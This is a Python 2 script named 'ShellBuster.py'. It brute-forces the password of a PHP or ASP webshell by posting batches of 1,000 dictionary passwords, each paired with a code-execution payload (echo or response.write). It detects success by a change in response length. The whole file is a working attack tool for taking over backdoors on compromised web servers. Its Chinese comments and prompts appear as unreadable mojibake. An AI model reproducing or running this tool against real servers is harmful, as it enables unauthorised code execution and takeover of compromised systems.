# -*- coding: UTF-8 -*-
#coding by v5est0r
#���ζ�����ύ������ʽ,һ�仰��������ǧ��
 
import requests,sys
import ConfigParser
 
shell = raw_input("������ľ���url��")
shell_type=raw_input("������ľ��ű�������asp��")
pass_dic=raw_input("�������ֵ��ļ�λ�ã�")
 
print '''
 
   Usage:python ShellBuster.py shell_url shell_type dic_dir
 
              Code by binghe/v5est0r
'''
 
 
 
post_data = {}  #�����ֵ伯
s = open(pass_dic,'r')
content = s.readlines() #���ж�ȡ�ֵ�
dics = len(content)/1000
 
print '��ǰ�ֵ��б�������Ϊ: %s' % str(len(content))
 
print "�ֵ佫���ָ�Ϊ %s ��" % str(dics)
 
group = []  #�ֵ�ÿ�ж�����,д��Ԫ��
for h in range(0,len(content)):
    password = str(content[h]).strip('\n')  #�޳����з�
    group.append(password)
#print group
 
 
if str(shell_type)=="php":
    post_test = {'test_pass_test': 'echo "test!!";'}
    res = requests.post(shell, data=post_test)
    wrong_res = res.text
    post_test.clear()
 
    for i in range(0, dics):
        new_group = []
        for k in range(i * 1000, (i + 1) * 1000):
            new_group.append(group[k])
            k += 1
        for each in new_group:
            post_data[each] = 'echo "password is %s";' % each
        r = requests.post(shell, data=post_data)
        #print "���ڽ��е� %s ���ֵ䱬��" % str(i + 1)
        post_data.clear()
        i += 1
        print r.text
        if len(r.text) != len(wrong_res):
            break
 
    new_group1 = []
    for kk in range(dics * 1000, len(content)):
        new_group1.append(group[kk])
        kk += 1
    for each in new_group1:
        post_data[each] = 'echo "password is %s";' % each
    r = requests.post(shell, data=post_data)
    print "���ڽ��������ֵ䱬��"
    print r.text
 
#v5est0r=response.write("password:v5est0r")
 
if shell_type =='asp':
    # ���潨����������ķ��ر�ʶ��
    post_test = {'test_pass_test': 'response.write("test!!!")'}
    res = requests.post(shell, data=post_test)
    wrong_res = res.text
    post_test.clear()
 
    for i in range(0, dics):
        new_group = []
        for k in range(i * 1000, (i + 1) * 1000):
            new_group.append(group[k])
            k += 1
        for each in new_group:
            post_data[each] = 'response.write("password: %s")' % each
        r = requests.post(shell, data=post_data)
        print "���ڽ��е� %s ���ֵ䱬��" % str(i + 1)
        post_data.clear()
        i += 1
        print r.text
        if len(r.text) != len(wrong_res):
            break
 
    new_group1 = []
    for kk in range(dics * 1000, len(content)):
        new_group1.append(group[kk])
        kk += 1
    for each in new_group1:
        post_data[each] = 'response.write("password: %s\t")' % each
    r = requests.post(shell, data=post_data)
    print "���ڽ��������ֵ䱬��"
    print r.text